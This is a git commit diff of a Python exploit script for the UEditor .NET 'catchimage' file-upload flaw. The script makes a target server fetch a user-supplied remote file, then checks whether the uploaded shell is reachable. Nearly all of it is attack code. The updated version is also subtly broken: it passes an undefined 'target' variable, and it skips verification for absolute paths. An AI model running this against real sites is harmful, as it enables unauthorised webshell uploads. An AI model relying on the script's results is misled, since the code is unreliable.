79a013b1ec2bfce7b7377c5615b5ce71ca9763cb
myh0st <1293348082@qq.com>
2023-10-23 10:34:43 +0800

    Update ueditor_net_upload.py

--- ueditor_net_upload.py
+++ ueditor_net_upload.py
@@ -1,9 +1,11 @@
 import requests
 import re
 import sys
+import webbrowser
+import  time
 
 
-def upload(url, shellpath):
+def verify(url, shellpath):
     photo_shell = shellpath
     headers = {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
@@ -13,15 +15,29 @@ def upload(url, shellpath):
         'Content-Type': 'application/x-www-form-urlencoded',
         'Upgrade-Insecure-Requests': '1'
         }
-    req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell,verify=False, timeout=5)
-    info = req.json()
+    req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell,verify=False, timeout=20)
+    try:
+        info = req.json()
+    except:
+        return ""
     print(info)
-    if info['state'] == 'SUCCESS':
-        print('[+] 上传成功！ 请查看响应包内容！',  url.replace("controller.ashx" ,info['list'][0]['url']))
-  
-        
-        
+    if info['state'] == 'SUCCESS' and info['list'][0]['url'] != None:
+        path = info['list'][0]['url']
+        if re.search('^/', path):
+            shellpath = "/".join(url.split("/")[:3]) + path
+        else:
+            shellpath = url.replace("controller.ashx" ,info['list'][0]['url'])
+            req2 = requests.get(shellpath, headers=headers, verify=False, timeout=20)
+            if req2.status_code == 200 and "VulnTest" in req2.text:
+                return shellpath
+    return ""
+    
+
 if __name__=="__main__":
     url = sys.argv[1]
     imgpath = sys.argv[2]
-    upload(url, imgpath)
+    info = verify(target, imgpath)
+    if info != "":
+        print("[+]漏洞存在，文件上传的地址为：", info)
+    else:
+        print("[-]漏洞不存在")
